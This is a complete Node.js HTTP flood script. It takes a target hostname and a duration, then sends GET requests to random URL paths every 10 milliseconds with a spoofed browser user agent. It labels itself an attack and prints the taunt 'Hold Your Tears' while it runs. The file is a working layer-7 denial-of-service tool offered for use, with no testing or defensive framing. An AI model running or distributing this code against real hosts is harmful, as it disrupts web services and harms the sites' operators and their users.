const http = require('http');
const { setTimeout } = require('timers');
const process = require('process');

// Parse inputs
let host = '';
let duration = 10; // Default duration in seconds

const args = process.argv.slice(2);

if (args.length === 2) {
    host = args[0];
    duration = parseInt(args[1]);
} else {
    console.error(`ERROR\n Usage: ${process.argv[1]} <Hostname> <Duration_in_seconds>`);
    process.exit(1);
}

// Ensure the host is in the correct format
if (!/^https?:\/\//.test(host)) {
    host = 'http://' + host;
}

// Generate URL Path
const generateUrlPath = () => {
    const msg = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?/,.';
    let data = '';
    for (let i = 0; i < 5; i++) {
        data += msg.charAt(Math.floor(Math.random() * msg.length));
    }
    return data;
};

// Perform the request (L7 HTTP request)
const attack = () => {
    const urlPath = generateUrlPath();
    const options = {
        method: 'GET',
        hostname: host.replace(/^https?:\/\//, ''), // Remove protocol (http:// or https://)
        path: `/${urlPath}`,
        headers: {
            'User-Agent': 'Mozilla/5.0',
            'Connection': 'keep-alive',
        },
    };

    const req = http.request(options, (res) => {
        // Ignore response
    });

    req.on('error', (err) => {
        console.error(`Request failed: ${err.message}`);
    });

    req.end();
};

// Print attack start message
console.log(`[#] Attack started on ${host} || Duration: ${duration}s`);

// Start time of the attack
const startTime = Date.now();
let threadNum = 0;

// Run the attack for the specified duration
const attackInterval = setInterval(() => {
    if (Date.now() - startTime >= duration * 1000) {
        clearInterval(attackInterval);
        console.log("\nAttack finished.");
        return;
    }

    // Call attack function to send requests
    attack();

    // Print status message
    threadNum++;
    process.stdout.write(`\r ${new Date().toLocaleTimeString()} [${threadNum}] #-#-# Hold Your Tears #-#-#`);
}, 10); // Adjusting this sleep time will affect requests per second
